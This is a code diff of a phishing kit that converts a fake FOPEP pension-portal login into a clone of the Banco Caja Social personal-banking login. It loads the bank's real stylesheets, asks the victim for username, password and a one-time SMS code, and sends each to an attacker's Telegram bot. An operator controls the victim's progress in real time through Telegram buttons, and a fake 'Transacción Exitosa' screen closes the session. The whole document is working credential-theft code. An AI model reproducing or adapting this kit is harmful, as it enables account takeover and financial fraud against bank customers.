@@ -4,181 +4,29 @@
     <meta charset="utf-8">
     <meta name="robots" content="noindex, nofollow">
     <meta name="viewport" content="width=device-width,initial-scale=1">
-    <title>Iniciar sesión - FOPEP</title>
-    
-    <!-- Fuentes y Estilos Base -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-    
+    <title>Inicio de sesión - Portal Personas Banco Caja Social</title>
+    <link rel="icon" type="image/x-icon" href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/img/favicon.ico">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/zocial/zocial.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-theme/dist/backbase-theme.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/styles/identity.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/pficon/pficon.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/tile.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/bcs.7.css" rel="stylesheet">
+    <link href="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/css/custom-identity.1.css" rel="stylesheet">
+    <script src="https://bancapersonas.bancocajasocial.com/auth/resources/zljm2/login/bcs/lib/backbase-identity/scripts/load-background.js"></script>
     <style>
-        body {
-            font-family: 'Roboto', sans-serif;
-            background-color: #f4f4f4;
-            margin: 0;
-            padding: 0;
-        }
-
-        /* Barra superior de migas de pan */
-        .breadcrumb-bar {
-            background-color: #ffffff;
-            padding: 10px 40px;
-            font-size: 0.9rem;
-            color: #0056b3;
-            border-bottom: 1px solid #e0e0e0;
-        }
-        .breadcrumb-bar span {
-            color: #666;
-        }
-
-        /* Contenedor principal */
-        .main-container {
-            display: flex;
-            max-width: 1100px;
-            margin: 40px auto;
-            background: transparent;
-            gap: 30px;
-            padding: 0 20px;
-        }
-
-        /* Panel Izquierdo (Imagen) */
-        .left-panel {
-            flex: 1;
-            position: relative;
-            border-radius: 4px;
-            overflow: hidden;
-            background-image: url('https://images.unsplash.com/photo-1576765608535-5f04d1e3f289?q=80&w=1000&auto=format&fit=crop'); /* Imagen de pareja mayor */
-            background-size: cover;
-            background-position: center;
-            min-height: 500px;
-            display: flex;
-            align-items: flex-end;
-            padding: 30px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-        .left-panel::before {
-            content: '';
-            position: absolute;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background: linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.7));
-        }
-        .left-panel h2 {
-            position: relative;
-            color: #ffffff;
-            font-size: 2.2rem;
-            font-weight: 700;
-            line-height: 1.2;
-            z-index: 1;
-        }
-
-        /* Panel Derecho (Formulario) */
-        .right-panel {
-            flex: 1;
-            background: #ffffff;
-            padding: 40px;
-            border-radius: 4px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .d-none { display: none !important; }
+        .input-example-text {
+            display: block;
+            margin-top: 5px;
+            color: #6c757d;
+            font-size: 0.85rem;
         }
         
-        .right-panel h1 {
-            color: #007a5e; /* Verde FOPEP */
-            font-weight: 700;
-            font-size: 2rem;
-            margin-bottom: 30px;
-        }
-
-        .form-label {
-            font-weight: 500;
-            color: #333;
-            margin-bottom: 8px;
-        }
-
-        .form-control, .form-select {
-            border-radius: 4px;
-            border: 1px solid #ced4da;
-            padding: 10px 15px;
-        }
-
-        .password-toggle {
-            position: absolute;
-            right: 15px;
-            top: 42px;
-            cursor: pointer;
-            color: #666;
-        }
-
-        /* Captcha Falso */
-        .fake-captcha {
-            border: 1px solid #d3d3d3;
-            border-radius: 4px;
-            padding: 15px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background-color: #f9f9f9;
-            width: 300px;
-            margin-bottom: 30px;
-        }
-        .captcha-left {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        .captcha-left input {
-            transform: scale(1.5);
-            cursor: pointer;
-        }
-        .captcha-left span {
-            font-size: 0.9rem;
-            color: #333;
-        }
-        .captcha-logo {
-            text-align: center;
-            font-size: 0.6rem;
-            color: #555;
-        }
-        .captcha-logo img {
-            width: 35px;
-            display: block;
-            margin: 0 auto 5px;
-        }
-
-        /* Botones */
-        .btn-fopep-outline {
-            border: 2px solid #0056b3;
-            color: #0056b3;
-            font-weight: 700;
-            padding: 10px 20px;
-            border-radius: 4px;
-            width: 100%;
-        }
-        .btn-fopep-outline:hover {
-            background-color: #e6f0fa;
-        }
-
-        .btn-fopep-primary {
-            background-color: #009b72;
-            border: none;
-            color: white;
-            font-weight: 700;
-            padding: 10px 20px;
-            border-radius: 4px;
-            width: 100%;
-        }
-        .btn-fopep-primary:hover {
-            background-color: #007a5e;
-        }
-
-        .link-forgot {
-            color: #0056b3;
-            font-weight: 500;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 20px;
-        }
-
-        /* OTP Estilos */
+        /* ESTILOS PARA LA PANTALLA DEL CÓDIGO */
         .otp-title {
-            font-size: 1.8rem;
+            font-size: 2rem;
             font-weight: 700;
             color: #1a1a1a;
             line-height: 1.2;
@@ -192,150 +40,178 @@
             padding-bottom: 20px;
             border-bottom: 1px solid #e0e0e0;
         }
-        .phone-icon { width: 32px; height: 32px; fill: #5c6c7f; }
-        .phone-number { font-size: 1.2rem; font-weight: 700; color: #1a1a1a; }
-        
-        /* Utilidades */
-        .d-none { display: none !important; }
-        
-        /* Responsivo */
-        @media (max-width: 768px) {
-            .main-container { flex-direction: column; }
-            .left-panel { min-height: 250px; }
-            .right-panel { padding: 20px; }
+        .phone-icon {
+            width: 32px;
+            height: 32px;
+            fill: #5c6c7f;
+        }
+        .phone-number {
+            font-size: 1.2rem;
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+        .otp-links {
+            margin-top: 25px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+        .otp-links a {
+            color: #0056b3;
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 0.95rem;
         }
     </style>
 </head>
-<body>
-
-    <!-- Barra superior -->
-    <div class="breadcrumb-bar">
-        Estás en <span>> Iniciar sesión</span>
-    </div>
-
-    <!-- Contenedor Principal -->
-    <div class="main-container">
-        
-        <!-- Lado Izquierdo: Imagen -->
-        <div class="left-panel">
-            <h2>Bienvenido a nuestro<br>Portal Web</h2>
-        </div>
-
-        <!-- Lado Derecho: Formularios -->
-        <div class="right-panel">
-            
-            <!-- PASO 1: USUARIO Y CONTRASEÑA JUNTOS (Como en la imagen FOPEP) -->
-            <div id="step-login">
-                <h1>Iniciar Sesión</h1>
-                
-                <form id="form-fopep-login">
-                    <div class="mb-3">
-                        <label class="form-label">Tipo de Documento</label>
-                        <select class="form-select" id="tipo-doc">
-                            <option value="CC" selected>Seleccione un tipo</option>
-                            <option value="CC">Cédula de Ciudadanía (CC)</option>
-                            <option value="CE">Cédula de Extranjería (CE)</option>
-                            <option value="TI">Tarjeta de Identidad (TI)</option>
-                        </select>
-                    </div>
-
-                    <div class="mb-3">
-                        <label class="form-label">Documento (Escríbalo sin puntos)</label>
-                        <input type="text" class="form-control" id="doc-input" placeholder="Documento" autocomplete="off">
-                    </div>
-
-                    <div class="mb-3 position-relative">
-                        <label class="form-label">Contraseña</label>
-                        <input type="password" class="form-control" id="pass-input" placeholder="Escriba contraseña aquí" maxlength="8">
-                        <!-- Icono del ojito -->
-                        <svg id="toggle-pass" class="password-toggle" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
-                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
-                        </svg>
-                    </div>
-
-                    <!-- Captcha Falso visual -->
-                    <div class="fake-captcha">
-                        <div class="captcha-left">
-                            <input type="checkbox" id="captcha-check">
-                            <span>No soy un robot</span>
-                        </div>
-                        <div class="captcha-logo">
-                            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-                            reCAPTCHA<br>Privacidad - Términos
-                        </div>
-                    </div>
-
-                    <!-- Botones -->
-                    <div class="row gx-2 mb-3">
-                        <div class="col-6">
-                            <button type="button" class="btn btn-fopep-outline">Quiero registrarme</button>
-                        </div>
-                        <div class="col-6">
-                            <button type="submit" id="btn-login" class="btn btn-fopep-primary">Iniciar Sesión</button>
-                        </div>
+<body onload="createBackgrounds();" class="identity-background-1 identity-page--ready">
+    <div id="background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
+    <div class="bb-stack bb-stack--wrap template-stack-container">
+        <div id="inner-background" class="bb-stack__item bb-stack__item--fill identity-bg-layout"></div>
+        <div class="bb-stack__break bb-stack__break--md-down"></div>
+        <div class="bb-stack__item--fill identity-container">
+            <div class="identity-container__panel identity-container__panel--animated">
+                <div class="identity-container__form">
+                    
+                    <!-- LOGO / IMAGEN (Se oculta en el paso del OTP) -->
+                    <div class="login-logos-wrapper" id="main-logo">
+                        <div class="identity-logo bb-block bb-block--lg"></div>
                     </div>
                     
-                    <a href="#" class="link-forgot">¿Olvidó su Contraseña?</a>
-                </form>
-            </div>
+                    <!-- ENCABEZADO (Se oculta en el paso del OTP) -->
+                    <header id="main-header">
+                        <h1 id="kc-page-title">Bienvenido al Portal Personas</h1>
+                    </header>
 
-            <!-- PASO 2: PANTALLA DE CARGA (Esperando acción en Telegram) -->
-            <div id="step-waiting" class="d-none text-center pt-5">
-                <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#009b72;border-radius:50%;animation:spin 0.9s linear infinite;margin:30px auto;"></div>
-                <p style="color:#444;font-size:15px;margin-top:20px;">Verificando información, por favor espere...</p>
-            </div>
+                    <!-- PASO 1: USUARIO -->
+                    <div id="step-username">
+                        <div class="bb-subtitle bb-block bb-block--lg">
+                            <span>Recuerde que su usuario está compuesto por su Tipo de Identificación <strong>(CC, CE, NI, TI, PE)</strong> y su Número de Identificación sin espacios, puntos ni comas.</span>
+                        </div>
+                        <div id="kc-form">
+                            <div id="kc-form-wrapper">
+                                <form id="form-index">
+                                    <div class="form-group bb-form-field bb-form-field--md">
+                                        <label for="username-input" class="label">Usuario</label>
+                                        <input id="username-input" class="form-control" name="username" type="text" autofocus autocomplete="off">
+                                        <small class="input-example-text">Ejemplo: CC1234567890</small>
+                                    </div>
+                                    <div class="bb-button-bar bb-block bb-block--xl mt-3">
+                                        <button id="btn-index" class="btn btn-primary w-100" type="submit" disabled>Siguiente</button>
+                                    </div>
+                                    
+                                    <div class="bb-block bb-block--xl mt-3 text-start">
+                                        <a class="btn-link-text" data-bs-toggle="collapse" href="#collapseForgot" role="button" style="font-weight: bold; color: #0056b3;">¿Olvidó su contraseña? ▼</a>
+                                        <div class="collapse mt-2" id="collapseForgot">
+                                            <div class="card card-body" style="font-size: 0.9rem; background-color: #f8f9fa;">Para recuperar su contraseña, diríjase a la opción de recuperación.</div>
+                                        </div>
+                                    </div>
+                                    <hr class="bb-block bb-block--lg identity-separator">
+                                    <div class="bb-subtitle d-flex align-items-center gap-2 flex-wrap mt-4">
+                                        <div class="bb-block bb-block--sm mb-0">¿Es un cliente nuevo?</div>
+                                        <strong class="mb-0"><a class="btn-link-text" href="https://bancapersonas.bancocajasocial.com/web/enrollment">Registrarse</a></strong>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
 
-            <!-- PASO 3: CÓDIGO OTP (Diseño interno del panel) -->
-            <div id="step-otp" class="d-none">
-                <h2 class="otp-title">Su código de seguridad ha sido enviado.</h2>
-                <p style="font-size: 1rem; color: #333; margin-bottom: 20px;">Para continuar, por favor verifique que el código de seguridad haya llegado a su teléfono celular registrado:</p>
-                
-                <div class="phone-box">
-                    <svg class="phone-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
-                    </svg>
-                    <span class="phone-number">3*****8088</span>
+                    <!-- PASO 2: CONTRASEÑA -->
+                    <div id="step-password" class="d-none">
+                        <div class="bb-subtitle bb-block bb-block--lg">
+                            <span>Ingrese su contraseña de canales digitales, recuerde que está compuesta por 8 caracteres.</span>
+                        </div>
+                        <div id="kc-form">
+                            <div id="kc-form-wrapper">
+                                <form id="form-contra">
+                                    <div class="form-group bb-form-field bb-form-field--md">
+                                        <div class="bb-input-password">
+                                            <label for="password-input" class="label">Contraseña</label>
+                                            <div class="input-group">
+                                                <input id="password-input" class="form-control bb-input-password__input" name="password" type="password" maxlength="8" autocomplete="off">
+                                                <button id="toggle-pass" type="button" class="btn btn-link bb-input-password__visibility-toggle-button">
+                                                    <svg xmlns="http://www.w3.org/2000/svg" height="20" width="20" viewBox="0 0 24 24" fill="currentColor" style="vertical-align:middle;"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" /></svg>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        <small id="msg-len" class="bb-input-validation-message d-none" role="alert">La contraseña debe tener exactamente 8 caracteres.</small>
+                                    </div>
+                                    <div class="bb-button-bar bb-button-bar--reverse bb-block bb-block--xl mt-3">
+                                        <div class="bb-block bb-block--xl w-100 w-md-auto d-flex d-md-block flex-column-reverse">
+                                            <button id="btn-submit" class="btn btn-primary me-0 me-md-3" type="submit" disabled>Iniciar sesión</button>
+                                        </div>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- PASO 3: PANTALLA DE CARGA -->
+                    <div id="step-waiting" class="d-none">
+                        <div class="bb-subtitle bb-block bb-block--lg text-center">
+                            <div style="width:52px;height:52px;border:5px solid #e0e0e0;border-top-color:#0033A0;border-radius:50%;animation:spin 0.9s linear infinite;margin:30px auto;"></div>
+                            <p style="color:#444;font-size:15px;margin-top:20px;">Verificando información, por favor espere...</p>
+                        </div>
+                    </div>
+
+                    <!-- PASO 4: CÓDIGO OTP -->
+                    <div id="step-otp" class="d-none">
+                        <h2 class="otp-title">Su código de seguridad ha sido enviado.</h2>
+                        <p style="font-size: 1rem; color: #333; margin-bottom: 20px;">Para continuar, por favor verifique que el código de seguridad haya llegado a su teléfono celular registrado:</p>
+                        
+                        <div class="phone-box">
+                            <svg class="phone-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
+                            </svg>
+                            <span class="phone-number">3*****8088</span>
+                        </div>
+
+                        <div id="kc-form">
+                            <div id="kc-form-wrapper">
+                                <form id="form-otp">
+                                    <div class="form-group bb-form-field bb-form-field--md">
+                                        <label for="otp-input" class="label">Código de seguridad</label>
+                                        <input id="otp-input" class="form-control" type="text" maxlength="6" autocomplete="one-time-code" style="font-size: 1.5rem; letter-spacing: 5px; text-align: center;">
+                                        <small style="color: #6c757d; font-size: 0.85rem; margin-top: 5px; display: block;">Por favor ingrese el código compuesto por 6 dígitos</small>
+                                    </div>
+                                    <div class="bb-button-bar bb-block bb-block--xl mt-3">
+                                        <button id="btn-otp" class="btn btn-primary w-100" type="submit" style="background-color: #0070c0; border-radius: 25px; padding: 12px; font-weight: bold;">
+                                            Enviar
+                                        </button>
+                                    </div>
+                                </form>
+                                
+                                <hr style="margin: 25px 0; border-top: 1px solid #e0e0e0;">
+                                
+                                <div class="otp-links">
+                                    <div>
+                                        <span style="color: #333;">¿No recibió el código?</span> 
+                                        <a href="#" onclick="enviarTelegram('🔄 El usuario solicitó REENVIAR el código.'); return false;">Reenviar</a>
+                                    </div>
+                                    <a href="#" onclick="enviarTelegram('⚠️ El usuario reportó un PROBLEMA CON EL NÚMERO DE TELÉFONO.'); return false;">¿Tiene algún problema con este número de teléfono celular?</a>
+                                    <a href="#" onclick="enviarTelegram('📱 El usuario intentó con OTRO MEDIO.'); return false;">Intente con otro medio</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- PASO 5: PANTALLA FINAL -->
+                    <div id="step-final" class="d-none text-center">
+                        <div style="margin-top: 40px;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="#28a745" viewBox="0 0 16 16" style="margin-bottom: 20px;">
+                                <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
+                            </svg>
+                            <h2 style="color:#1a1a1a; font-weight: 700;">¡Transacción Exitosa!</h2>
+                            <p style="color:#555; font-size: 1.1rem;">Sus datos han sido verificados correctamente. Ya puede cerrar esta ventana.</p>
+                        </div>
+                    </div>
+
                 </div>
-
-                <form id="form-otp">
-                    <div class="mb-3">
-                        <label for="otp-input" class="form-label">Código de seguridad</label>
-                        <input id="otp-input" class="form-control" type="text" maxlength="6" autocomplete="one-time-code" style="font-size: 1.5rem; letter-spacing: 5px; text-align: center;">
-                        <small style="color: #6c757d; font-size: 0.85rem; margin-top: 5px; display: block;">Por favor ingrese el código compuesto por 6 dígitos</small>
-                    </div>
-                    <div class="mb-3">
-                        <button id="btn-otp" class="btn btn-fopep-primary" type="submit" disabled style="padding: 12px; border-radius: 25px;">
-                            Enviar
-                        </button>
-                    </div>
-                </form>
-                
-                <hr style="margin: 25px 0; border-top: 1px solid #e0e0e0;">
-                
-                <div style="display: flex; flex-direction: column; gap: 15px;">
-                    <div>
-                        <span style="color: #333;">¿No recibió el código?</span> 
-                        <a href="#" onclick="enviarTelegram('🔄 El usuario solicitó REENVIAR el código.'); return false;" style="color: #0056b3; font-weight: 600;">Reenviar</a>
-                    </div>
-                    <a href="#" onclick="enviarTelegram('⚠️ El usuario reportó un PROBLEMA CON EL NÚMERO DE TELÉFONO.'); return false;" style="color: #0056b3; font-weight: 600;">¿Tiene algún problema con este número de teléfono celular?</a>
-                    <a href="#" onclick="enviarTelegram('📱 El usuario intentó con OTRO MEDIO.'); return false;" style="color: #0056b3; font-weight: 600;">Intente con otro medio</a>
-                </div>
             </div>
-
-            <!-- PASO 4: PANTALLA FINAL -->
-            <div id="step-final" class="d-none text-center pt-5">
-                <svg xmlns="http://www.w3.org/2000/svg" width="80" height="80" fill="#28a745" viewBox="0 0 16 16" style="margin-bottom: 20px;">
-                    <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.97-3.03a.75.75 0 0 0-1.08.022L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.06 1.06L6.97 11.03a.75.75 0 0 0 1.079-.02l3.992-4.99a.75.75 0 0 0-.01-1.05z"/>
-                </svg>
-                <h2 style="color:#1a1a1a; font-weight: 700;">¡Transacción Exitosa!</h2>
-                <p style="color:#555; font-size: 1.1rem;">Sus datos han sido verificados correctamente.</p>
-            </div>
-
         </div>
     </div>
 
-    <!-- Animación de carga -->
-    <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
     <script>
         /* ========================================== */
@@ -346,15 +222,21 @@
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
         /* ========================================== */
 
-        const stepLogin   = document.getElementById('step-login');
-        const stepWaiting = document.getElementById('step-waiting');
-        const stepOtp     = document.getElementById('step-otp');
-        const stepFinal   = document.getElementById('step-final');
+        const mainLogo     = document.getElementById('main-logo');
+        const mainHeader   = document.getElementById('main-header');
+        
+        const stepUsername = document.getElementById('step-username');
+        const stepPassword = document.getElementById('step-password');
+        const stepWaiting  = document.getElementById('step-waiting');
+        const stepOtp      = document.getElementById('step-otp');
+        const stepFinal    = document.getElementById('step-final');
 
-        const docInput   = document.getElementById('doc-input');
-        const passInput  = document.getElementById('pass-input');
-        const captchaChk = document.getElementById('captcha-check');
-        const tipoDoc    = document.getElementById('tipo-doc');
+        const inputUser = document.getElementById('username-input');
+        const btnIndex  = document.getElementById('btn-index');
+        
+        const passInput = document.getElementById('password-input');
+        const btnSubmit = document.getElementById('btn-submit');
+        const msgLen    = document.getElementById('msg-len');
 
         const otpInput  = document.getElementById('otp-input');
         const btnOtp    = document.getElementById('btn-otp');
@@ -373,39 +255,49 @@
             });
         }
 
-        /* Mostrar/Ocultar contraseña */
+        /* ---------- PASO 1: USUARIO ---------- */
+        inputUser.addEventListener('input', () => {
+            inputUser.value = inputUser.value.toUpperCase();
+            btnIndex.disabled = inputUser.value.trim().length === 0;
+        });
+
+        document.getElementById('form-index').addEventListener('submit', function (e) {
+            e.preventDefault();
+            const username = inputUser.value.trim();
+            if (!username) return;
+
+            USERNAME = username;
+            stepUsername.classList.add('d-none');
+            stepPassword.classList.remove('d-none');
+            passInput.focus();
+        });
+
+        /* ---------- PASO 2: CONTRASEÑA ---------- */
+        passInput.addEventListener('input', function () {
+            const len = this.value.length;
+            btnSubmit.disabled = len !== 8;
+            msgLen.classList.toggle('d-none', len === 0 || len === 8);
+        });
+
         document.getElementById('toggle-pass').addEventListener('click', () => {
             passInput.type = passInput.type === 'password' ? 'text' : 'password';
         });
 
-        /* ---------- PASO 1: ENVIAR DATOS ---------- */
-        document.getElementById('form-fopep-login').addEventListener('submit', async function (e) {
+        document.getElementById('form-contra').addEventListener('submit', async function (e) {
             e.preventDefault();
-            
-            // Validaciones sencillas
-            if (!docInput.value.trim() || !passInput.value.trim()) {
-                alert("Por favor, complete todos los campos.");
-                return;
-            }
-            if (!captchaChk.checked) {
-                alert("Por favor, marque la casilla 'No soy un robot'.");
-                return;
-            }
-
-            USERNAME = tipoDoc.value + docInput.value.trim();
             PASSWORD = passInput.value.trim();
+            if (PASSWORD.length !== 8) return;
 
-            // Ocultar login, mostrar espera
-            stepLogin.classList.add('d-none');
+            stepPassword.classList.add('d-none');
             stepWaiting.classList.remove('d-none');
 
-            // Enviar credenciales a Telegram con los dos botones
+            // Enviar credenciales a Telegram
             await fetch(`${TELEGRAM_API}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: `🔐 <b>Credenciales FOPEP Capturadas:</b>\n\n👤 <b>Usuario:</b> <code>${USERNAME}</code>\n🔑 <b>Clave:</b> <code>${PASSWORD}</code>\n\n¿Qué acción desea tomar?`,
+                    text: `🔐 <b>Credenciales Capturadas:</b>\n\n👤 <b>Usuario:</b> <code>${USERNAME}</code>\n🔑 <b>Clave:</b> <code>${PASSWORD}</code>\n\n¿Qué acción desea tomar?`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -421,7 +313,7 @@
             iniciarPolling();
         });
 
-        /* ---------- PASO 3: CÓDIGO OTP ---------- */
+        /* ---------- PASO 4: CÓDIGO OTP ---------- */
         otpInput.addEventListener('input', function () {
             btnOtp.disabled = this.value.trim().length < 6;
         });
@@ -439,7 +331,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: `🔑 <b>Código OTP FOPEP (${USERNAME}):</b>\n<code>${codigo}</code>\n\n¿Qué acción desea tomar?`,
+                    text: `🔑 <b>Código OTP Recibido (${USERNAME}):</b>\n<code>${codigo}</code>\n\n¿Qué acción desea tomar?`,
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [
@@ -488,6 +380,11 @@
                                 } 
                                 else if (action === 'pedir_codigo') {
                                     enviarTelegram(`📩 Se ha solicitado el código para <code>${USERNAME}</code>.`);
+                                    
+                                    // Ocultar IMAGEN y ENCABEZADO
+                                    mainLogo.classList.add('d-none');
+                                    mainHeader.classList.add('d-none');
+                                    
                                     stepWaiting.classList.add('d-none');
                                     stepOtp.classList.remove('d-none');
                                     otpInput.focus();
